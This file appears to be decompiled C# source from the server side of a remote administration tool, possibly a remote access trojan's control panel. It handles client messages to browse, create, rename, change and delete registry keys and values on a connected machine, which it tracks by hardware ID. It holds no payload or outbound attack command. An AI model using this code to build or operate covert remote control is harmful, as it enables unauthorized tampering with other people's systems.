using System.Collections.Generic;
using System.Windows.Forms;
using Leb128;
using Microsoft.Win32;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerRegedit
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string text = (string)objects[1];
		if (text == null)
		{
			return;
		}
		switch (text.Length)
		{
		case 5:
		{
			if (!(text == "Error"))
			{
				break;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormRegedit form2 = (FormRegedit)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		case 7:
		{
			char c2 = text[0];
			if (c2 != 'C')
			{
				if (c2 != 'L' || !(text == "LoadKey"))
				{
					break;
				}
				FormRegedit FM5 = (FormRegedit)client.Tag;
				if (FM5 == null)
				{
					break;
				}
				string rootKey = (string)objects[2];
				List<RegistrySeeker.RegSeekerMatch> seekerMatches = new List<RegistrySeeker.RegSeekerMatch>();
				int i = 3;
				while (i < objects.Length)
				{
					RegistrySeeker.RegSeekerMatch regSeekerMatch3 = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch3.Key = (string)objects[i++];
					object[] array = LEB128.Read((byte[])objects[i++]);
					List<RegistrySeeker.RegValueData> list = new List<RegistrySeeker.RegValueData>();
					int j = 0;
					while (j < array.Length)
					{
						list.Add(new RegistrySeeker.RegValueData
						{
							Name = (string)array[j++],
							Kind = (RegistryValueKind)(int)array[j++],
							Data = (byte[])array[j++]
						});
					}
					regSeekerMatch3.Data = list.ToArray();
					regSeekerMatch3.HasSubKeys = (bool)objects[i++];
					seekerMatches.Add(regSeekerMatch3);
				}
				FM5.Invoke((MethodInvoker)delegate
				{
					FM5.AddKeys(rootKey, seekerMatches.ToArray());
				});
			}
			else
			{
				if (!(text == "Connect"))
				{
					break;
				}
				FormRegedit form = (FormRegedit)Application.OpenForms["Regedit:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					break;
				}
				string rootKey2 = (string)objects[3];
				List<RegistrySeeker.RegSeekerMatch> seekerMatches2 = new List<RegistrySeeker.RegSeekerMatch>();
				int k = 4;
				while (k < objects.Length)
				{
					RegistrySeeker.RegSeekerMatch regSeekerMatch4 = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch4.Key = (string)objects[k++];
					object[] array2 = LEB128.Read((byte[])objects[k++]);
					List<RegistrySeeker.RegValueData> list2 = new List<RegistrySeeker.RegValueData>();
					int l = 0;
					while (l < array2.Length)
					{
						list2.Add(new RegistrySeeker.RegValueData
						{
							Name = (string)array2[l++],
							Kind = (RegistryValueKind)(int)array2[l++],
							Data = (byte[])array2[l++]
						});
					}
					regSeekerMatch4.Data = list2.ToArray();
					regSeekerMatch4.HasSubKeys = (bool)objects[k++];
					seekerMatches2.Add(regSeekerMatch4);
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.materialLabel1.Enabled = true;
					form.lstRegistryValues.Enabled = true;
					form.tvRegistryDirectory.Enabled = true;
					form.Text = "Regedit [" + (string)objects[2] + "]";
					form.materialLabel1.Text = "Succues Connect";
					form.AddKeys(rootKey2, seekerMatches2.ToArray());
					form.client = client;
				});
				client.Tag = form;
				client.Hwid = (string)objects[2];
			}
			break;
		}
		case 9:
		{
			char c3 = text[0];
			switch (c3)
			{
			default:
			{
				if (c3 != 'R' || !(text == "RenameKey"))
				{
					break;
				}
				FormRegedit FM8 = (FormRegedit)client.Tag;
				if (FM8 != null)
				{
					FM8.Invoke((MethodInvoker)delegate
					{
						FM8.RenameKey((string)objects[2], (string)objects[3], (string)objects[4]);
					});
				}
				break;
			}
			case 'D':
			{
				if (!(text == "DeleteKey"))
				{
					break;
				}
				FormRegedit FM7 = (FormRegedit)client.Tag;
				if (FM7 != null)
				{
					FM7.Invoke((MethodInvoker)delegate
					{
						FM7.DeleteKey((string)objects[2], (string)objects[3]);
					});
				}
				break;
			}
			case 'C':
			{
				if (!(text == "CreateKey"))
				{
					break;
				}
				FormRegedit FM6 = (FormRegedit)client.Tag;
				if (FM6 != null)
				{
					string ParentPath = (string)objects[2];
					RegistrySeeker.RegSeekerMatch regSeekerMatch5 = new RegistrySeeker.RegSeekerMatch();
					regSeekerMatch5.Key = (string)objects[3];
					object[] array3 = LEB128.Read((byte[])objects[4]);
					List<RegistrySeeker.RegValueData> list3 = new List<RegistrySeeker.RegValueData>();
					int m = 0;
					while (m < array3.Length)
					{
						list3.Add(new RegistrySeeker.RegValueData
						{
							Name = (string)array3[m++],
							Kind = (RegistryValueKind)(int)array3[m++],
							Data = (byte[])array3[m++]
						});
					}
					regSeekerMatch5.Data = list3.ToArray();
					regSeekerMatch5.HasSubKeys = (bool)objects[5];
					FM6.Invoke((MethodInvoker)delegate
					{
						FM6.CreateNewKey(ParentPath, regSeekerMatch5);
					});
				}
				break;
			}
			}
			break;
		}
		case 11:
		{
			char c = text[2];
			if (c <= 'e')
			{
				if (c != 'a')
				{
					if (c != 'e' || !(text == "CreateValue"))
					{
						break;
					}
					FormRegedit FM = (FormRegedit)client.Tag;
					if (FM == null)
					{
						break;
					}
					string keyPath = (string)objects[2];
					string text2 = (string)objects[3];
					string name = (string)objects[4];
					RegistryValueKind kind = RegistryValueKind.None;
					if (text2 != null)
					{
						switch (text2.Length)
						{
						case 2:
							switch (text2[0])
							{
							case '1':
								if (text2 == "11")
								{
									kind = RegistryValueKind.QWord;
								}
								break;
							case '-':
								if (text2 == "-1")
								{
									kind = RegistryValueKind.None;
								}
								break;
							}
							break;
						case 1:
							switch (text2[0])
							{
							case '0':
								kind = RegistryValueKind.Unknown;
								break;
							case '1':
								kind = RegistryValueKind.String;
								break;
							case '2':
								kind = RegistryValueKind.ExpandString;
								break;
							case '3':
								kind = RegistryValueKind.Binary;
								break;
							case '4':
								kind = RegistryValueKind.DWord;
								break;
							case '7':
								kind = RegistryValueKind.MultiString;
								break;
							}
							break;
						}
					}
					RegistrySeeker.RegValueData regValueData = new RegistrySeeker.RegValueData();
					regValueData.Name = name;
					regValueData.Kind = kind;
					regValueData.Data = new byte[0];
					FM.Invoke((MethodInvoker)delegate
					{
						FM.CreateValue(keyPath, regValueData);
					});
				}
				else
				{
					if (!(text == "ChangeValue"))
					{
						break;
					}
					FormRegedit FM2 = (FormRegedit)client.Tag;
					if (FM2 != null)
					{
						string keyPath2 = (string)objects[2];
						RegistrySeeker.RegValueData regValueData2 = new RegistrySeeker.RegValueData();
						regValueData2.Name = (string)objects[3];
						regValueData2.Kind = (RegistryValueKind)(int)objects[4];
						regValueData2.Data = (byte[])objects[5];
						FM2.Invoke((MethodInvoker)delegate
						{
							FM2.ChangeValue(keyPath2, regValueData2);
						});
					}
				}
			}
			else if (c != 'l')
			{
				if (c != 'n' || !(text == "RenameValue"))
				{
					break;
				}
				FormRegedit FM3 = (FormRegedit)client.Tag;
				if (FM3 != null)
				{
					FM3.Invoke((MethodInvoker)delegate
					{
						FM3.RenameValue((string)objects[2], (string)objects[3], (string)objects[4]);
					});
				}
			}
			else
			{
				if (!(text == "DeleteValue"))
				{
					break;
				}
				FormRegedit FM4 = (FormRegedit)client.Tag;
				if (FM4 != null)
				{
					FM4.Invoke((MethodInvoker)delegate
					{
						FM4.DeleteValue((string)objects[2], (string)objects[3]);
					});
				}
			}
			break;
		}
		case 6:
		case 8:
		case 10:
			break;
		}
	}
}
